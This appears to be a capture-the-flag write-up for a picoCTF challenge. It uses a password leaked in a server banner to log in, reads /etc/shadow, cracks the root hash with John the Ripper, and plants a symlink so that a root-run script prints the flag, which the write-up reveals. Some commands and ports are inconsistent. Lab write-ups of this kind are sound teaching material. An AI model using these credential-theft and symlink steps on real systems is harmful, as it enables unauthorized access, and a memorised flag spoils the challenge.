## Challege reads as follow 

Can you abuse the banner?
The server has been leaking some crucial information on 
tethys.picoctf.net 57019. Use the leaked information to get to the server.

To connect to the running application use 
nc tethys.picoctf.net 61514. From the above information abuse the machine and find the flag in the /root directory.

## let's connect with first server and obtain the leaking information 

upon connecting with leaking server, we got the following credentials:

## nc ethys.picoctf.net 57019

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234 

now connect with another server using the password , provided by leaking server : 

muneer1631-picoctf@webshell:~$ nc tethys.picoctf.net 54357
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234

What is the top cyber security conference in the world?
DEF CON

the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

player@challenge:~$ 

## Hey freaks, we're in now

## There are two hints, let's try with second trick first 😎 . First as the questions suggests  the flag is in root folder. 
let's check the permission of flag.txt 

__________________________________________________________________________________

player@challenge:/root$ ls -la 

ls -la 

total 16

drwxr-xr-x 1 root root    6 Mar  9 16:39 .

drwxr-xr-x 1 root root   29 Apr 17 10:17 ..

-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc

-rw-r--r-- 1 root root  148 Aug 17  2015 .profile

-rwx------ 1 root root   46 Mar  9 16:39 flag.txt

-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py

player@challenge:/root$  
____________________________________________________________________________________

As we can see, it you need root Privileges to read the file . 
As I said there are two hint above , I solved it in two ways. 

1. Crack the password of root  and enter as root to read the contents of the file 
2. use the Hint of symblink and following along the way to solve it. 

## Method-1 : crack the hash 

read users ( cat /etc/passwd)  and copy the root username and save it into a text file. 
______________________________________________________________________________
player@challenge:/root$ cat /etc/passwd

cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
_______________________________________________________________________________

Similary read the hash of passwords stored in /ect/shadow

player@challenge:~$ cat /etc/shadow

cat /etc/shadow

root:$6$6QFbdp2H$R0BGBJtG0DlGFx9H0AjuQNOhlcssBxApM.CjDEiNzfYkVeJRNy2d98SDURNebD5/l4Hu2yyVk.ePLNEg/56DV0:19791:0:99999:7:::
___________________________________________________________________________________________________________________________

Use "unshadow" tool which merges password and shadow files into one, typically for cracking passwords. As 
you saved the username of root and hash of password, Take help of "unshadow" commnad to merge both files.

unshadow name.txt password.txt > passwords.txt

Now , you've merged file named as passwords. 

## Did you hear about John ?
NO, "John the Ripper is a powerful password cracking tool often used for security testing and analysis."

Provide the path where John (Already Installed in Kali Linux) and the password file 
_____________________________________________________________________________________________
┌──(user㉿kali)-[~/Desktop]

└─$ john /usr/sbin/ password 

Using default input encoding: UTF-8

Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])

Cost 1 (iteration count) is 5000 for all loaded hashes

Will run 2 OpenMP threads

Proceeding with single, rules:Single

Press 'q' or Ctrl-C to abort, almost any other key for status

Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.

Almost done: Processing the remaining buffered candidate passwords, if any.

Proceeding with wordlist:/usr/share/john/password.lst

*iloveyou         (root)*   

1g 0:00:00:01 DONE 2/3 (2024-04-16 21:07) 0.6211g/s 598.7p/s 598.7c/s 598.7C/s 123456..john

Use the "--show" option to display all of the cracked passwords reliably

Session completed. 
__________________________________________________________________________________________

Oh , you did it buddy. "iloveyou" is the password of root. Switch to root and read the contents of the file. 

# Mathod-2 : Symlink Attack

As we saw that you'll need to have root privileges to read the content and we cracked the hash and  entered as root. 
But this time, we're gonna use the **First Hint-Symlink**

See the following, we can find script.py let also read what this says

player@challenge:/root$ ls -la

ls -la

total 16

drwxr-xr-x 1 root root    6 Mar  9 16:39 .

drwxr-xr-x 1 root root   41 May 16 07:36 ..

-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc

-rw-r--r-- 1 root root  148 Aug 17  2015 .profile

-rwx------ 1 root root   46 Mar  9 16:39 flag.txt

-rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py

player@challenge:/root$ cat script.py

cat script.py

import os

import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt

**Note: We can see that everytime we connect back to server, it loads /home/player/banner**

--> Now , we'll use symlink here, 

## **Symlinks, or symbolic links, are a type of file system object that acts as a reference to another file or directory**

**creating a symlink like creating refrence not actual hard link , we'll create symbolik link for /root/flag.txt in the home directory of user.**

**So, when we connect back to sever it will load the banner which will be referrencing the /root/flag.txt and flag will be loaded.**

Let's first move or rename the banner in home directory of user

player@challenge:~$ mv banner hint   

mv banner hint

player@challenge:~$ ls

ls

hint  text

Now, let make symlink of flag using following command : 

player@challenge:~$ ln -s /root/flag.txt banner

ln -s /root/flag.txt banner

player@challenge:~$ ls

ls

banner  hint  text

We have made it, just exit and connect back to server, it will load the banner , which referrencing flag and you'll have flag.

muneer1631-picoctf@webshell:~$ nc tethys.picoctf.net 56152

picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}

